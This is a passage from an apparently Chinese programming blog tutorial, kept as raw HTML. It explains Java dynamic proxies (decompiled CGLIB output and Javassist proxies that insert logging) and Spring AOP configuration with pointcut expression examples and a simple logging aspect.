            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; var1 == &lt;span&gt;null&lt;/span&gt; ? 0&lt;span&gt; : ((Number)var1).intValue();
        } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;super&lt;/span&gt;&lt;span&gt;.hashCode();
        }
    }

    &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; Object CGLIB$clone$4() &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; CloneNotSupportedException {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;super&lt;/span&gt;&lt;span&gt;.clone();
    }

    &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; Object clone() &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; CloneNotSupportedException {
        MethodInterceptor var10000 &lt;/span&gt;= &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.CGLIB$CALLBACK_0;
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (var10000 == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
            CGLIB$BIND_CALLBACKS(&lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;);
            var10000 &lt;/span&gt;= &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.CGLIB$CALLBACK_0;
        }

        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; var10000 != &lt;span&gt;null&lt;/span&gt; ? var10000.intercept(&lt;span&gt;this&lt;/span&gt;, CGLIB$clone$4$Method, CGLIB$emptyArgs, CGLIB$clone$4$Proxy) : &lt;span&gt;super&lt;/span&gt;&lt;span&gt;.clone();
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt;&lt;span&gt; MethodProxy CGLIB$findMethodProxy(Signature var0) {
        String var10000 &lt;/span&gt;=&lt;span&gt; var0.toString();
        &lt;/span&gt;&lt;span&gt;switch&lt;/span&gt;&lt;span&gt;(var10000.hashCode()) {
        &lt;/span&gt;&lt;span&gt;case&lt;/span&gt; -1422568652&lt;span&gt;:
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (var10000.equals(&quot;add()V&quot;&lt;span&gt;)) {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; CGLIB$add$0&lt;span&gt;$Proxy;
            }
            &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;case&lt;/span&gt; -508378822&lt;span&gt;:
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (var10000.equals(&quot;clone()Ljava/lang/Object;&quot;&lt;span&gt;)) {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; CGLIB$clone$4&lt;span&gt;$Proxy;
            }
            &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;case&lt;/span&gt; 1826985398&lt;span&gt;:
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (var10000.equals(&quot;equals(Ljava/lang/Object;)Z&quot;&lt;span&gt;)) {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; CGLIB$equals$1&lt;span&gt;$Proxy;
            }
            &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;case&lt;/span&gt; 1913648695&lt;span&gt;:
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (var10000.equals(&quot;toString()Ljava/lang/String;&quot;&lt;span&gt;)) {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; CGLIB$toString$2&lt;span&gt;$Proxy;
            }
            &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;case&lt;/span&gt; 1984935277&lt;span&gt;:
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (var10000.equals(&quot;hashCode()I&quot;&lt;span&gt;)) {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; CGLIB$hashCode$3&lt;span&gt;$Proxy;
            }
        }

        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; UserServiceImpl$$EnhancerByCGLIB$$b26297df() {
        CGLIB$BIND_CALLBACKS(&lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;);
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; CGLIB$SET_THREAD_CALLBACKS(Callback[] var0) {
        CGLIB$THREAD_CALLBACKS.set(var0);
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; CGLIB$SET_STATIC_CALLBACKS(Callback[] var0) {
        CGLIB$STATIC_CALLBACKS &lt;/span&gt;=&lt;span&gt; var0;
    }

    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; CGLIB$BIND_CALLBACKS(Object var0) {
        UserServiceImpl$$EnhancerByCGLIB$$b26297df var1 &lt;/span&gt;=&lt;span&gt; (UserServiceImpl$$EnhancerByCGLIB$$b26297df)var0;
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;var1.CGLIB$BOUND) {
            var1.CGLIB$BOUND &lt;/span&gt;= &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
            Object var10000 &lt;/span&gt;=&lt;span&gt; CGLIB$THREAD_CALLBACKS.get();
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (var10000 == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
                var10000 &lt;/span&gt;=&lt;span&gt; CGLIB$STATIC_CALLBACKS;
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (var10000 == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
                    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
                }
            }

            var1.CGLIB$CALLBACK_0 &lt;/span&gt;= (MethodInterceptor)((Callback[])var10000)[0&lt;span&gt;];
        }

    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Object newInstance(Callback[] var1) {
        CGLIB$SET_THREAD_CALLBACKS(var1);
        UserServiceImpl$$EnhancerByCGLIB$$b26297df var10000 &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; UserServiceImpl$$EnhancerByCGLIB$$b26297df();
        CGLIB$SET_THREAD_CALLBACKS((Callback[])&lt;/span&gt;&lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; var10000;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Object newInstance(Callback var1) {
        CGLIB$SET_THREAD_CALLBACKS(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Callback[]{var1});
        UserServiceImpl$$EnhancerByCGLIB$$b26297df var10000 &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; UserServiceImpl$$EnhancerByCGLIB$$b26297df();
        CGLIB$SET_THREAD_CALLBACKS((Callback[])&lt;/span&gt;&lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; var10000;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Object newInstance(Class[] var1, Object[] var2, Callback[] var3) {
        CGLIB$SET_THREAD_CALLBACKS(var3);
        UserServiceImpl$$EnhancerByCGLIB$$b26297df var10000 &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; UserServiceImpl$$EnhancerByCGLIB$$b26297df;
        &lt;/span&gt;&lt;span&gt;switch&lt;/span&gt;&lt;span&gt;(var1.length) {
        &lt;/span&gt;&lt;span&gt;case&lt;/span&gt; 0&lt;span&gt;:
            var10000.&lt;/span&gt;&amp;lt;init&amp;gt;&lt;span&gt;();
            CGLIB$SET_THREAD_CALLBACKS((Callback[])&lt;/span&gt;&lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; var10000;
        &lt;/span&gt;&lt;span&gt;default&lt;/span&gt;&lt;span&gt;:
            &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; IllegalArgumentException(&quot;Constructor not found&quot;&lt;span&gt;);
        }
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Callback getCallback(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; var1) {
        CGLIB$BIND_CALLBACKS(&lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;);
        MethodInterceptor var10000;
        &lt;/span&gt;&lt;span&gt;switch&lt;/span&gt;&lt;span&gt;(var1) {
        &lt;/span&gt;&lt;span&gt;case&lt;/span&gt; 0&lt;span&gt;:
            var10000 &lt;/span&gt;= &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.CGLIB$CALLBACK_0;
            &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;default&lt;/span&gt;&lt;span&gt;:
            var10000 &lt;/span&gt;= &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; var10000;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; setCallback(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; var1, Callback var2) {
        &lt;/span&gt;&lt;span&gt;switch&lt;/span&gt;&lt;span&gt;(var1) {
        &lt;/span&gt;&lt;span&gt;case&lt;/span&gt; 0&lt;span&gt;:
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.CGLIB$CALLBACK_0 =&lt;span&gt; (MethodInterceptor)var2;
        &lt;/span&gt;&lt;span&gt;default&lt;/span&gt;&lt;span&gt;:
        }
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Callback[] getCallbacks() {
        CGLIB$BIND_CALLBACKS(&lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; Callback[]{&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.CGLIB$CALLBACK_0};
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setCallbacks(Callback[] var1) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.CGLIB$CALLBACK_0 = (MethodInterceptor)var1[0&lt;span&gt;];
    }

    &lt;/span&gt;&lt;span&gt;static&lt;/span&gt;&lt;span&gt; {
        CGLIB$STATICHOOK2();
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;　　第四种：Javassist动态代理（&lt;span&gt;在动态字节码插桩详解&lt;/span&gt;）&lt;/h3&gt;
&lt;p&gt;　　① 定义一个JavassistDynamicProxy实现Javassist动态代理：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.toby.proxy;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; javassist.util.proxy.ProxyFactory;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; javassist.util.proxy.ProxyObject;

&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * @desc: javassist
 * &lt;/span&gt;&lt;span&gt;@author&lt;/span&gt;&lt;span&gt;: toby
 * @date: 2019/8/15 20:22
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; JavassistDynamicProxy {

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 创建Javassist动态代理
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; targetObject
     * &lt;/span&gt;&lt;span&gt;@throws&lt;/span&gt;&lt;span&gt; Exception
     * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;
     &lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; Object createJavassistDynamicProxy(&lt;span&gt;final&lt;/span&gt; Object targetObject)&lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Exception {
        ProxyFactory factory &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; ProxyFactory();
        factory.setInterfaces(targetObject.getClass().getInterfaces());
        Class&lt;/span&gt;&amp;lt;?&amp;gt; proxyClass =&lt;span&gt; factory.createClass();
        Object javassistProxy &lt;/span&gt;=&lt;span&gt; proxyClass.newInstance();
        ((ProxyObject)javassistProxy).setHandler((self,thisMethod,proceed,args)&lt;/span&gt;-&amp;gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;写对应的增强代码&lt;/span&gt;
            System.out.println(&quot;Javassist日志记录开始&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;调用真正的业务方法&lt;/span&gt;
            Object obj =&lt;span&gt; thisMethod.invoke(targetObject,args);
            System.out.println(&lt;/span&gt;&quot;Javassist日志记录结束&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; obj;
        });
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; javassistProxy;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　② 定义一个JavassistBytecodeDynamicProxy实现Javassist动态代理：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.toby.proxy;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt; javassist.*&lt;span&gt;;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.lang.reflect.Field;

&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * @desc: javassist 字节码动态代理
 * &lt;/span&gt;&lt;span&gt;@author&lt;/span&gt;&lt;span&gt;: toby
 * @date: 2019/8/15 20:42
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; JavassistBytecodeDynamicProxy {

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 创建Javassist字节码动态代理
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; targetObject
     * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;&lt;span&gt;
     * &lt;/span&gt;&lt;span&gt;@throws&lt;/span&gt;&lt;span&gt; Exception
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; Object createJavassistBytecodeDynamicProxy(&lt;span&gt;final&lt;/span&gt; Object targetObject) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Exception {
        ClassPool pool &lt;/span&gt;=&lt;span&gt; ClassPool.getDefault();
        CtClass proxyClass &lt;/span&gt;= pool.makeClass(&quot;JavassistProxy&quot; +  &quot;&amp;amp;&quot; +&lt;span&gt;targetObject.getClass().getName());
        proxyClass.addInterface(pool.get(targetObject.getClass().getInterfaces()[&lt;/span&gt;0&lt;span&gt;].getName()));
        proxyClass.addConstructor(CtNewConstructor.defaultConstructor(proxyClass));
        proxyClass.addField(CtField.make(&lt;/span&gt;&quot;private &quot; + targetObject.getClass().getName() + &quot; targetObject;&quot;&lt;span&gt;, proxyClass));
        proxyClass.addMethod(CtNewMethod.make(&lt;/span&gt;&quot;public void add() { \n&quot; +
                &quot;System.out.println(\&quot;Javassist字节码日志记录开始\&quot;);\n&quot; +
                &quot;targetObject.add();\n&quot; +
                &quot;System.out.println(\&quot;Javassist字节码日志记录结束\&quot;);\n&quot;+
                &quot;}&quot;&lt;span&gt;, proxyClass));
        Class&lt;/span&gt;&amp;lt;?&amp;gt; clazz =&lt;span&gt; proxyClass.toClass();
        Object bytecodeProxy &lt;/span&gt;=&lt;span&gt; clazz.newInstance();
        Field field &lt;/span&gt;= bytecodeProxy.getClass().getDeclaredField(&quot;targetObject&quot;&lt;span&gt;);
        field.setAccessible(&lt;/span&gt;&lt;span&gt;true&lt;/span&gt;&lt;span&gt;);
        field.set(bytecodeProxy,targetObject);
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; bytecodeProxy;
    }

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 创建Javassist字节码动态代理2
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; targetObject
     * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;&lt;span&gt;
     * &lt;/span&gt;&lt;span&gt;@throws&lt;/span&gt;&lt;span&gt; Exception
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; Object createJavassistBytecodeDynamicProxy2(&lt;span&gt;final&lt;/span&gt; Object targetObject) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Exception {
        ClassPool pool &lt;/span&gt;=&lt;span&gt; ClassPool.getDefault();
        pool.appendSystemPath();
        CtClass ctl &lt;/span&gt;=&lt;span&gt; pool.get(targetObject.getClass().getName());
        ctl.setName(&lt;/span&gt;&quot;JavassistProxy&quot; +  &quot;&amp;amp;&quot; +&lt;span&gt; targetObject.getClass().getName());
        CtMethod ctMethod &lt;/span&gt;= ctl.getDeclaredMethod(&quot;add&quot;&lt;span&gt;);
        ctMethod.insertBefore(&lt;/span&gt;&quot;System.out.println(\&quot;Javassist字节码2日志记录开始\&quot;);&quot;&lt;span&gt;);
        ctMethod.insertAfter(&lt;/span&gt;&quot;System.out.println(\&quot;Javassist字节码2日志记录结束\&quot;);&quot;&lt;span&gt;);
        Class&lt;/span&gt;&amp;lt;?&amp;gt; clazz =&lt;span&gt; ctl.toClass();
        Object bytecodeProxy &lt;/span&gt;=&lt;span&gt; clazz.newInstance();
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; bytecodeProxy;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt; 四、Spring AOP&lt;/h2&gt;
&lt;h3&gt;　　Spring AOP提供两种编程风格，详细用法见Spring官网：&lt;span&gt;&lt;strong&gt;&lt;a href=&quot;https://docs.spring.io/spring-framework/docs/current/spring-framework-reference/core.html#aop-aspectj-support&quot; target=&quot;_blank&quot;&gt;&lt;span&gt;https://docs.spring.io/spring-framework/docs/current/spring-framework-reference/core.html#aop-aspectj-support&lt;/span&gt;&lt;/a&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;　　① @AspectJ support（利用aspectj的注解）&lt;/p&gt;
&lt;p&gt;　　② Schema-based AOP support（基于xml aop:config命名空间）&lt;/p&gt;
&lt;h3&gt;　　启用@AspectJ支持&lt;/h3&gt;
&lt;p&gt;　　① 使用Java Configuration启用@AspectJ支持：要使用Java @Configuration启用@AspectJ支持，要添加@EnableAspectJAutoProxy注释：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@Configuration
@EnableAspectJAutoProxy
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; AppConfig {

}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　② 使用XML配置启用@AspectJ支持：要使用基于xml的配置启用@AspectJ支持，可以使用aop:aspectj-autoproxy元素&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;aop:aspectj-autoproxy&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;　　声明一个Aspect&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@Aspect
@Component
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; UserAspect {
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;　　声明一个Pointcut&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
@Pointcut(&quot;execution(* com.toby.service.UserService.*(..))&quot;&lt;span&gt;)&lt;/span&gt;&lt;code data-lang=&quot;java&quot;/&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; pointCutExecution(){}&lt;code data-lang=&quot;java&quot;/&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;　　Spring AOP支持的9种切入点表达式&lt;/h3&gt;
&lt;p&gt;　　&lt;strong&gt;① execution：&lt;/strong&gt;execution用于匹配方法执行 join points连接点，最小粒度方法　&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
execution(modifiers-pattern? ret-type-pattern declaring-type-pattern?name-pattern(param-pattern) throws-pattern?)
这里问号表示当前项可以有也可以没有，其中各项的语义如下
modifiers-pattern：方法的可见性，如public，protected；
ret-type-pattern：方法的返回值类型，如int，void等；
declaring-type-pattern：方法所在类的全路径名，如com.spring.Aspect；
name-pattern：方法名类型，如buisinessService()；
param-pattern：方法的参数类型，如java.lang.String；
throws-pattern：方法抛出的异常类型，如java.lang.Exception；
example:
@Pointcut(&quot;execution(* com.toby.dao.*.*(..))&quot;)//匹配com.toby.dao包下的任意接口和类的任意方法
@Pointcut(&quot;execution(public * com.toby.dao.*.*(..))&quot;)//匹配com.toby.dao包下的任意接口和类的public方法
@Pointcut(&quot;execution(public * com.toby.dao.*.*())&quot;)//匹配com.toby.dao包下的任意接口和类的public 无方法参数的方法
@Pointcut(&quot;execution(* com.toby.dao.*.*(java.lang.String, ..))&quot;)//匹配com.toby.dao包下的任意接口和类的第一个参数为String类型的方法
@Pointcut(&quot;execution(* com.toby.dao.*.*(java.lang.String))&quot;)//匹配com.toby.dao包下的任意接口和类的只有一个参数，且参数为String类型的方法
@Pointcut(&quot;execution(* com.toby.dao.*.*(java.lang.String))&quot;)//匹配com.toby.dao包下的任意接口和类的只有一个参数，且参数为String类型的方法
@Pointcut(&quot;execution(public * *(..))&quot;)//匹配任意的public方法
@Pointcut(&quot;execution(* te*(..))&quot;)//匹配任意的以te开头的方法
@Pointcut(&quot;execution(* com.toby.dao.IndexDao.*(..))&quot;)//匹配com.toby.dao.IndexDao接口中任意的方法
@Pointcut(&quot;execution(* com.toby.dao..*.*(..))&quot;)//匹配com.toby.dao包及其子包中任意的方法
关于这个表达式的详细写法,可以参考官网：https://docs.spring.io/spring-framework/docs/current/spring-framework-reference/core.html#aop-pointcuts-examples
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　定义一个AopConfig配置类：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.toby.config;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.context.annotation.ComponentScan;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.context.annotation.Configuration;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.context.annotation.EnableAspectJAutoProxy;

&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * @desc: aop配置类
 * &lt;/span&gt;&lt;span&gt;@author&lt;/span&gt;&lt;span&gt;: toby
 * @date: 2019/8/5 23:48
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
@Configuration
&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * 此处需要注意的是，如果配置设置proxyTargetClass=false，或默认为false，则是用JDK代理，否则使用的是CGLIB代理
 * JDK代理的实现方式是基于接口实现，代理类继承Proxy，实现接口。而CGLIB继承被代理的类来实现。
 * 所以使用target会保证目标不变，匹配目标对象不会受到这个设置的影响。
 * 但是使用this时，会根据该选项的设置，CGLIB this可以代理原因是继承了被代理的对象也就是目标对象，JDK的this就不能被代理了。
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
@EnableAspectJAutoProxy(proxyTargetClass &lt;/span&gt;= &lt;span&gt;true&lt;/span&gt;&lt;span&gt;)
@ComponentScan(basePackages&lt;/span&gt;=&quot;com.toby&quot;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; AopConfig {
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　定义一个UserAspect：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.toby.aspect;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt; org.aspectj.lang.annotation.*&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.stereotype.Component;

&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * @desc: 用户切面，该切面一定要交给spring容器管理
 * &lt;/span&gt;&lt;span&gt;@author&lt;/span&gt;&lt;span&gt;: toby
 * @date: 2019/8/5 22:56
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
@Aspect
@Component
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; UserAspect {

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * For matching method execution join points. This is the primary pointcut designator to use when working with Spring AOP.
     * execution用于匹配方法执行 join points连接点，最小粒度方法
     * 详细用法参考：&lt;/span&gt;&lt;span&gt;https://docs.spring.io/spring-framework/docs/current/spring-framework-reference/core.html&lt;/span&gt;&lt;span&gt;#aop-pointcuts-examples
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
    @Pointcut(&lt;/span&gt;&quot;execution(* com.toby.service.UserService.*(..))&quot;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; pointCutExecution(){}

    @Before(&lt;/span&gt;&quot;pointCutExecution()&quot;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; before(){
        System.out.println(&lt;/span&gt;&quot;--------before--------&quot;&lt;span&gt;);
    }

    @After(&lt;/span&gt;&quot;pointCutExecution()&quot;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; after(){
        System.out.println(&lt;/span&gt;&quot;--------after--------&quot;&lt;span&gt;);
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　定义一个启动测试类AopMain（&lt;strong&gt;&lt;span&gt;下同&lt;/span&gt;&lt;/strong&gt;）：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.toby;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.toby.config.AopConfig;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.toby.service.UserService;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.context.annotation.AnnotationConfigApplicationContext;

&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * @desc: aop启动类
 * &lt;/span&gt;&lt;span&gt;@author&lt;/span&gt;&lt;span&gt;: toby
 * @date: 2019/8/5 23:50
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; AopMain {
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; main(String[] args) {
